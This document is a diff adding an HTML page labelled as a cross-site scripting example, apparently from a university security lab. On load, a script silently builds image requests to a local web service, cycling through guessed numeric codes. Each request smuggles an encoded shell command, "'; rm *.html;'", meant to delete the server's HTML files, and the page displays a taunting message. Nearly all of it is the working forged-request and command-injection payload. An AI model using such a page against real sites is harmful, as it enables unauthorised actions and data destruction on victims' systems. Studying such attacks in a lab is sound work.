@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+<title>cross site scripting example</title> 
+
+<script>
+	function add_malicious_imgs() {
+        let possible_codes = [
+            "138075", "180018", "221961", "263904", "305847", "347790", "389733", "431676",
+            "473619", "515562", "557505", "599448", "641391", "683334", "725277", "767220",
+            "809163", "851106", "893049", "934992", "976935"
+            ];
+            
+            for (let i = 0; i < possible_codes.length; i++) {
+            let node = document.createElement("img");
+            let newsrc = `http://localhost:8888/${possible_codes[i]}/add/url/%27%3B%20rm%20%2A.html%3B%27`;
+            node.setAttribute("src", newsrc);
+        } 
+    }
+</script>
+
+</head>
+
+<body onload="add_malicious_imgs()">
+
+<p> HAHAHA GOT YOU!!! </p>
+<p> The views and opinions expressed in this page are strictly those of the page author. The contents of this page have not been reviewed or approved by the University of Minnesota. </p>
+</body>
+
+</html>
